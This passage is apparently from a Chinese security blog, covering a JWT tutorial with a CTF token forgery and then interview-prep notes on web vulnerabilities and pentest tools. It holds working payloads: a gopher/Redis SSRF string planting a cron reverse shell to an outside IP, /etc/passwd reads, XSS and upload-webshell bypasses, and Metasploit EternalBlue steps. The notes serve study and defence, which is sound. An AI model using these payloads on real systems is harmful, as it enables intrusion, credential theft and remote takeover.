鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。\n扩展性：用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。\nCSRF: 因为是 基于cookie 来进行用户识别的，cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。\n\nJWT与Session的差异相同点：它们都是存储用户信息；\n不同点\n\nSession是在服务器端的，而JWT是在客户端的。\n\nSession方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。\n\nSession的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端\n\n\n\n基于Token的身份认证 与 基于服务器的身份认证基于服务器的身份认证在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：\n\nHTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证\n\n传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。\n这种基于服务器的身份认证方式存在一些问题：\n\nSessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。\nScalability : 由于Session是在内存中的，这就带来一些扩展性的问题。\nCORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。\nCSRF : 用户很容易受到CSRF攻击。\n\n用Token的好处\n无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。\n安全：Token不是Cookie。（The token, not a  cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!\ntoken在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。\n\n什么时候用JWT下列场景中使用JSON Web Token是很有用的：\n\nAuthorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。\nInformation Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web  Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。\n\nJWT结构JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：\n\nHeader\nPayload\nSignature\n\n下面具体来看看每个部分\nHeader（头部）jwt头部承载两部分信息\n\n声明类型：类似于jwt\n声明加密的算法：通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。\n\n&#123;  &#x27;typ&#x27;: &#x27;JWT&#x27;,  &#x27;alg&#x27;: &#x27;HS256&#x27;&#125;\n\n然后将头部进行base64加密得到第一部分\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n\n\n\n\n可以将JWT中的alg算法修改为none：\nJWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。\n\nPayload（载荷）payload就是存放有效信息的地方，这些有效信息包含三个部分\n\nregistered 标准中注册的声明\npublic 公共的声明\nprivate 私有的声明\n\n标签中注册的声明\n\niss: jwt签发者\nsub: jwt所面向的用户\naud: 接收jwt的一方\nexp: jwt的过期时间，这个过期时间必须要大于签发时间\nnbf: 定义在什么时间之前，该jwt都是不可用的.\niat: jwt的签发时间\njti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。\n\n公共的声明\n公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息。但不建议添加敏感信息，因为该部分在客户端可解密。\n私有的声明\n私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。\n下面是一个自己定义的payload\n&#123;  &quot;sub&quot;: &quot;1234567890&quot;,  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,  &quot;iat&quot;: 1451888119,  &quot;exp&quot;: 1454516119,  &quot;nbf&quot;: 1451888119,  &quot;name&quot;: &quot;John Doe&quot;,  &quot;admin&quot;: true&#125;\n\n将其base64加密得到jwt第二部分\neyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9\n\n\n\n\n注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。\n\nSignature（签证）签证信息由3个部分组成\n\nheader（base64加密后的）\npayload（base64加密后的）\nsecret\n\n这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。\n// javascriptvar encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);var signature = HMACSHA256(encodedString, &#x27;secret&#x27;); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n\nHMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)\n\n\n\n\n注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。\n\nJWT认证过程客户端接受服务器的JWT将其存储在Cookie或loaclSrorage中。此后，客户端将在与服务器进行交互中都会带JWT。如果它存储在Cookie中，就可以自动发送，但不会跨域，因此一般是将它放在HTTP请求的**Header Authorization字段中当跨域时，也可以将JWT被放置于POST**请求的数据主体中。\n服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。\n一般是在请求头里加入Authorization，并加上Bearer标注：\nfetch(&#x27;api/user/1&#x27;, &#123;  headers: &#123;    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token  &#125;&#125;)\n\n\n\n\nJWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。\nJWT安全隐患\n修改算法为none\n修改算法从RS256到HS256\n信息泄露 密钥泄露\n爆破密钥\n\n这里我们着重说一下jwt伪造，这个考点在ctf中经常出现\nJWT伪造当我面拿到一串JWT\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM\n\n我们去在线解jwt网站encode https://jwt.io/\n\n所以，我们的目的就是把false改成true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。\n验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。\n服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。\n因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查\n我们需要对secret进行爆破\n推荐工具  https://github.com/brendan-rius/c-jwt-cracker\n破解出来的加密密钥key就是：54l7y，\n现在我们可以任意构造我们想要的jwt\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q\n\n构造成功\n","categories":["学习"]},{"title":"面试prepare","url":"/2023/04/06/%E9%9D%A2%E8%AF%95prepare/","content":"面试prepare前言本人最近准备找一份暑期实习，于是自己写了一份面经\n写的不好，仅供参考\nsql注入常见的关系型数据库mysql、sqlserver、oracle、access、sqlite、postgreSQL\n\nmysql:3306 \n\nsqlserver:1433 \n\norecal:1521 \n\nPostgreSQL:5432 \n\ndb2:50000\n\nMongoDB:27017 \n\nredis:6379 \n\nmemcached:11211\n\n\nSQL注入有哪几种注入类型？从注入参数类型分：数字型注入、字符型注入、搜索型注入从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入 ，\n二次注入（参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入）\n从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入\nSQL注入的危害及防御危害\n\n数据库泄露 \n数据库被破坏 \n网站崩溃 \n服务器被植入木马\n\n防御\n\n代码层面对查询参数进行转义 \n预编译与参数绑定 \n利用WAF防御\n\nsql注入getshell\n存在SQL注入漏洞\nweb目录具有写入权限\n找到网站的绝对路径\nsecure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）\n\n绕过方式\n大小写\n双写\n注释符  &#x2F;**&#x2F;\n编码绕过 %20 %09 %0a\n括号绕过\n将表明转为十六进制绕过引号\njoin绕过逗号\nlike绕过等于号\n\nxss原理xss的本质是javascript代码执行，所以说原理就是用户在可控参数输入恶意的js代码，然后该代码被执行成功\n如何验证存在xss漏洞第一步，寻找用户可控的参数（输入点） 第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理 第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过\nxss有哪几种类型DOM型XSS攻击者将带有恶意js代码的参数传递到网站的前端页面中，该代码不会传入服务器直接在客户的浏览器执行。\n反射性型XSS攻击者将带有恶意js代码的参数传递给网站，经过服务器的然后返回到客户端，在客户的浏览器执行。\n存储型XSS攻击者将带有恶意js代码的参数传递给网站，经过服务器存储在数据库中，任何一个客户端在访问该条数据时，恶意的js代码都会在该客户端的浏览器执行。\nxss危害\n盗用用户的COOKIE\n修改DOM\n插入广告（黑页等）\n发动xss蠕虫攻击\n劫持用户行为，进一步渗透内网\n\nxss修复\n在服务端进行输入检测，过滤特殊字符\n对输出内容进行编码转义\n在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。\n设置httponly为true\n\n绕过\n双写\n\n对不能构造script标签的情况下使用事件进行绕过\n&lt;input  value=&#x27;123&#x27; onclick=&#x27;alert()&#x27;&gt;\n\n超链接绕过\n&lt;a src=javascript:alert()&gt;123&lt;/a&gt;\n\nssrf原理服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。\n危害SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。\n内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。\n利用方式SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。\n以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：\ncurl -vvv &#x27;dict://127.0.0.1:6379/info&#x27; curl -vvv &#x27;file:///etc/passwd&#x27; # * 注意: 链接使用单引号，避免$变量问题 curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;\n\n\n\n绕过采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成\n\n\n8进制格式：0300.0250.0.1\n\n16进制格式：0xC0.0xA8.0.1\n\n10进制整数格式：3232235521\n\n16进制整数格式：0xC0A80001\n\n合并后两位：1.1.278 &#x2F; 1.1.755\n\n合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267\n\n0.0.0.0这个IP可以直接访问到本地\n\nxip.io 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，\n例如192.168.0.1.xip.io，解析到192.168.0.1。\n\n\n\n防御方式\n\n过滤返回的信息\n统一错误信息\n限制请求的端口\n禁止不常用的协议\n对DNS Rebinding，考虑使用DNS缓存或者Host白名单\n\n\n\n限制访问方法只能使用GET\n限制访问的协议只能是http或https，其他协议直接拒绝访问\n检测特殊字符CRLF，存在则直接拒绝访问\n设置setInstanceFollowRedirects属性为false，禁止跟随302跳转；禁止跳转的目的是防止攻击者利用跳转访问内网，从而绕过之后的黑名单校验\n解析url中域名对应的ipv4地址：   \n该地址先过黑名单校验，不允许是内网地址，利用正则表达式对ip进行过滤\n使用ip对url中的域名进行替换，访问资源时都以ip进行访问；这样可以防御DNS Rebinding类的攻击\n\n\n\n文件上传基本概念用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的命令。\n常见的安全问题：\n（1）上传的是脚本文件，服务器Web容器解释并执行了用户上传的脚本，导致代码执行。\n（2）上传的文件是病毒、木马，引诱用户或者管理员进行下载执行。\n（3）上传文件是钓鱼图片或者为包含了脚本的图片，在某些版本的浏览器中作为脚本执行，或被用于钓鱼欺诈。\n\n\n文件上传漏洞方式1.客户端方式\n主要方式就是JS检查。绕过：（1）首先选择正常的文件进行上传（2）用BurpSuit进行抓包修改后缀然后完成文件上传.2.绕过文件上传检查功能（1）白名单校对——%00截断\n因为在很多语言中，比如CorPHP等语言的常用字符串处理函数中,0x00都被认为是终止符。如xxx.php%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为0x00字符截断的关系，最终会变成xxx.php。原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。\n绕过.htaccess文件\nhtaccess 在站点的根目录下面，不是在apache目录下，但是它属于apache的一个配置文件\n\n其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错\n.user.iniphp.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。\nauto_prepend_file = &lt;filename&gt;         //包含在文件头auto_append_file = &lt;filename&gt;          //包含在文件尾\n\n于是我们可以先上传.user.ini，然后上传一句话木马，让所有文件都包含了一句话木马\n前端js绕过抓包直接修改\n黑白名单绕过可以上传phtml php3 php4 php5 Php php (空格) php.，pphphp\n修改content-type,添加GIF89a头csrf原理攻击者利用服务器对用户的信任，从而欺骗受害者去服务器上执行受害者不知情的请求。\n攻击者会伪造一个用户发送给服务器的正常链接，其核心主要是要和已登录（已认证）的用户去发请求。CSRF不需要知道用户的Cookie，CSRF自己并不会发请求给服务器，一切交给用户\n防御（1）避免在URL中明文显示特定操作的参数内容；\n（2）使用同步令牌（Synchronizer Token）,检查客户端请求是否包含令牌及其有效性；（常用的做法，并且保证每次token的值完全随机且每次都不同）\n（3）检查Referer Header，拒绝来自非本网站的直接URL请求。\n（4）不要在客户端保存敏感信息（比如身份认证信息）；\n（5）设置会话过期机制，比如20分钟无操作，直接登录超时退出；\n（6）敏感信息的修改时需要对身份进行二次确认，比如修改账号时，需要判断旧密码；\n（7）敏感信息的修改使用post而不是get\n（8）避免交叉漏洞， 如XSS等\n（9）禁止跨域访问\n（10）在响应中设置CSP（Content-Security-Policy）内容安全策略\nXXEXXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时\n服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理\n导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。\nsqlmap常用指令-h                                           显示基本帮助信息\n-hh                                         显示高级帮助信息\n–version                                显示版本号\n-v                                           详细等级（0-6 默认 1）-u                                          指定目标url\n-d                                          直接连接数据库\n-l                                           从burp代理日志的解析目标\n-r                                           从文件中加载http请求\n-g                                          从google dork的结果作为目标url\n-c                                          从INI配置文件中加载选项\n\n–purge      【重新扫描（–purge 删除原先对该目标扫描的记录）\n\n–tables      【获取表名\n\n–dbs         【检测站点包含哪些数据库\n\n–current-db    【获取当前的数据库名\n\n–current-user  【检测当前用户\n\n–is-dba   【判断站点的当前用户是否为数据库管理员\n\n–batch      【默认确认，不询问你是否输入\n\n–search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）\n\n–threads 10  【线程，sqlmap线程最高设置为10\n\n–level 3        【sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头                       的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5\n\n–risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全\n\n-v   【详细的等级(0-6)  0：只显示Python的回溯，错误和关键消息。  1：显示信息和警告消息。  2：显示调试消息。  3：有效载荷注入。  4：显示HTTP请求。  5：显示HTTP响应头。  6：显示HTTP响应页面的内容\n\n–privileges  【查看权限\n\n–tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件\n\n–method “POST” –data “page&#x3D;1&amp;id&#x3D;2”   【POST方式提交数据\n\n–threads number　　【采用多线程 后接线程数\n\n–referer  “”  【使用referer欺骗\n\n–user-agent “”     【自定义user-agent\n\n–proxy “目标地址″   【使用代理注入\n\n\n1.指定目标url\nsqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;\n\n2.从文件中获取多个url\nsqlmap -m 1.txt\n\n3.从文件中加载HTTP请求\nsqlmap -r  url.txt\n\n4.利用google获取目标\nsqlmap -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;\n\n5.从burp日志中获取目标\nsqlmap -l    burp.txt\n\n实例演示-sqlmap注入检测\n1.GET参数注入\nsqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;\n\n2.POST参数注入\nsqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;\n\n\n\n\nsqlmap -u  “http://www.xx.com?id=x“    【查询是否存在注入点\n\n–dbs         【检测站点包含哪些数据库\n\n–current-db    【获取当前的数据库名\n\n–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称\n\n–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段\n\n–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容\n\n\nPOST注入：\n（1）目标地址http:// www.xxx.com /login.asp\n（2）打开brup代理。\n（3）点击表单提交\n（4）burp获取拦截信息（post）\n（5）右键保存文件（.txt）到指定目录下\n（6）运行sqlmap并执行如下命令：\n\n用例：sqlmap -r okay.txt  -p  username\n&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）\nAWVS介绍Acunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过Web浏览器访问和遵循HTTP&#x2F;HTTPS规则的Web站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。\nAWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。\n功能特点\n自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试\n\n业内最先进且深入的SQL注入和跨站脚本测试\n\n高级渗透测试工具，例如HTPP Editor和HTTP Fuzzer\n\n可视化宏记录器帮助您轻松测试web表格和受密码保护的区域\n\n支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制\n\n丰富的报告功能，包括VISA PCI依从性报告\n\n高速的多线程扫描器轻松检索成千上万的页面\n\n智能爬行程序检测web服务器类型和应用程序语言\n\nAcunetix检索并分析网站，包括flash内容，SOAP和AJAX\n\n端口扫描web服务器并对在服务器上运行的网络服务执行安全检查\n\n可到处网站漏洞文件\n\n\n工作原理\n扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。\n\n在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS分析每一个页面中需要输入数据的地方，进而尝试3所有的输入组合。这是一个自动扫描阶段 。\n\n在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。\n\n在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。\n\n\n页面介绍主菜单功能介绍：主菜单共有5个模块，分别为Dashboard、Targets、Vulnerabilities、Scans和Reports。\n\nDashboard：仪表盘，显示扫描过的网站的漏洞信息\nTargets：目标网站，需要被扫描的网站\nVulnerabilities：漏洞，显示所有被扫描出来的网站漏洞\nScans：扫描目标站点，从Target里面选择目标站点进行扫描\nReports：漏洞扫描完成后生成的报告\n\n设置菜单功能介绍：设置菜单共有8个模块，分别为Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings\n\nUsers：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置\nScan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描\nNetwork Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议\nIssue Trackers：问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等\nEmail Settings：邮件设置，配置邮件发送信息\nEngines：引擎，引擎安装删除禁用设置\nExcluded Hours：扫描时间设置，可设置空闲时间扫描\nProxy Settings：代理设置，设置代理服务器信息\n\nAPPSCAN介绍AppScan是IBM的一款web安全扫描工具，主要适用于Windows系统。该软件内置强大的扫描引擎，可以测试和评估Web服务和应用程序的风险检查，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。\n工作原理1）通过探索了解整个web页面结果\n2）通过分析，使用扫描规则库对修改的HTTP Request进行攻击尝试\n3）分析 Response 来验证是否存在安全漏洞\nwireshark软件功能1、分析网络底层协议； 2、解决网络故障问题； 3、找寻网络安全问题；\n软件原理当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。将网络接口设置在监听模式，便可以将网上传输的源源不断的信息截获。嗅探技术常常用于网络故障诊断、协议分析、应用性能分析和网络安全保障等各个领域\n过滤协议过滤tcp，只显示TCP协议的数据包列表 http，只查看HTTP协议的数据包列表 icmp，只显示ICMP协议的数据包列表\nip过滤ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表\n\n端口过滤tcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。tcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。\n\nHttp模式过滤http.request.method==“GET”, 只显示HTTP GET方法的\n\n逻辑运算符为 and&#x2F;or&#x2F;not过滤多个条件组合时，使用and&#x2F;or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为：ip.addr == 192.168.1.104 and icmp\nnmap\n\n\n参数(注意区分大小写)\n说明\n\n\n\n-sT\nTCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。\n\n\n-sS\n半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。\n\n\n-sF  -sN\n秘密FIN数据包扫描、Xmas Tree、Null扫描模式\n\n\n-sP\nping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。\n\n\n-sU\nUDP扫描，但UDP扫描是不可靠的\n\n\n-sA\n这项高级的扫描方法通常用来穿过防火墙的规则集\n\n\n-sV\n探测端口服务版本\n\n\n-Pn\n扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描\n\n\n-v\n显示扫描过程，推荐使用\n\n\n-h\n帮助选项，是最清楚的帮助文档\n\n\n-p\n指定端口，如“1-65535、1433、135、22、80”等\n\n\n-O\n启用远程操作系统检测，存在误报\n\n\n-A\n全面系统检测、启用脚本检测、扫描等\n\n\n-oN&#x2F;-oX&#x2F;-oG\n将报告写入文件，分别是正常、XML、grepable 三种格式\n\n\n-T4\n针对TCP端口禁止动态扫描延迟超过10ms\n\n\n-iL\n读取主机列表，例如，“-iL C:\\ip.txt”\n\n\n1、扫描单个目标\nnmap ip\n如：nmap 192.168.0.101\n\n2、扫描多个目标\nnmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。\n如：nmap 192.168.0.101 192.168.0.110\n\n3、扫描一个范围内的目标\nnmap xxx.xxx.xxx.xxx-xxx\n如：nmap 192.168.0.100-110\n\n4、扫描目标地址所在某网段\nnamp xxx.xxx.xxx.xxx&#x2F;xx\n如：nmap 192.168.0.1/24\n\n5、扫描包含主机列表的文件中的所有地址\nnmap -iL \n如：nmap -iL /root/target.txt\n\n6、扫描除了一个目标地址之外的所有地址\nnmap ip段 -exclude 被排除的ip\n如：nmap 192.168.0.100-110 -exclude 192.168.0.103   nmap 192.168.0.1/24 -exclude 192.168.0.103 \n\n7、扫描目标地址的指定端口\nnmap ip -p 端口1，端口2，端口3……\n如:nmap 192.168.0.101 -p 80,8080,3306,3389\n\n8、扫描目标地址C段的在线主机\nnmap -sP ip段\n如：nmap -sP 192.168.0.1/24\n\n9、扫描目标地址操作系统版本进行探测\nnmap -O ip\n如：nmap -O 192.168.0.101\n\n10、扫描目标所开放的全部端口（半开式）\nnmap -sS -p 端口号(多个用“,”隔开) -v ip\n如：nmap -sS -p 1-65535 192.168.0.101\n\n\n\nMSF简介Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。\n它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具\n使用根据漏洞名称搜索 : search ms17_010\n1、运用辅助模块扫描目标\n设置模块：use auxiliary/scanner/smb/smb_ms17_010\n查看设置：options \n设置目标地址：set rhosts 192.168.174.129\n目标端口默认是445，如果用nmap端口扫描windows文件共享服务不是开放在445端口上面，那这里需要进行修改，set rport 目标端口\n设置好了之后，run或者exploit 进行攻击\n2、设置攻击模块对目标进行攻击\n使用攻击模块：use exploit/windows/smb/ms17_010_eternalblue\n查看所需设置：options \n设置目标地址：set RHOSTS 192.168.174.129\n设置目标端口：set RPORT 445\n设置payload：set payload windows/x64/meterpreter/reverse_tcp\n设置本地地址：set LHOST 192.168.174.192\n攻击：run或者exploit \nLinux命令命令：netstat\n用途：查看系统的网络连接状态、路由表、接口统计等信息\n格式：netstat [选项]\n常用选项：\n\n-a：显示所有活动连接\n-n：以数字形式显示\n-p：显示进程信息\n-t：查看TCP协议相关信息\n-u：查看UDP协议相关信息\n-r：显示路由表信息\n\n命令：network\n用途：启用、禁用网络接口配置\n重启network格式：service network restart\n命令：chmod\n用途：权限控制命令\nLinux系统下文件权限显示如下图所示，第一个数字，数字代表的意义为：\n\n– 普通文件\nd 目录\ns socket套接字\nl 软链接\np 管道\nc 字符设备\nb 块设备\n\nuname -a: 此命令可以查看当前Linux系统内核具体版本、使用的发行版版本、以及当前处理器架构!(这里的架构非常重要,大部分针对Linux攻击载荷都需要明确处理器架构才能使用)\n存放系统信息的文件\n\ncat &#x2F;etc&#x2F;issue: 连接系统时显示的提示信息,默认一般会存放发行版名称等信息(PS:用户可能会把这个当成备忘录存放一些口令)\ncat &#x2F;etc&#x2F;-release: 详细的发行版系统版本信息(不同的发行版可能名字会略有不同,并且此文件可能有多个,这种情况下我们可以使用通配符来解决这个问题。ls &#x2F;etc | grep “release””可以使用此命令来查看你系统中此文件夹具体有哪些!)\ncat &#x2F;proc&#x2F;version: 详细的系统内核信息,用于编译内核的gcc的版本以及内核编译的时间。\ncat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version: 系统内核信息,相当uname -v(&#x2F;proc&#x2F;sys&#x2F;kernel文件夹中可以监视和调整Linux内核中的各种活动!但需要管理员权限!)\n\n进程信息\nps: 列出本用户当前使用的终端中运行的进程\n    ps -elf: 显示详细的(-l)带UID,PPIP,C与STIME栏位(-f)现行终端机下的所有进程(-e)\n    ps aux: 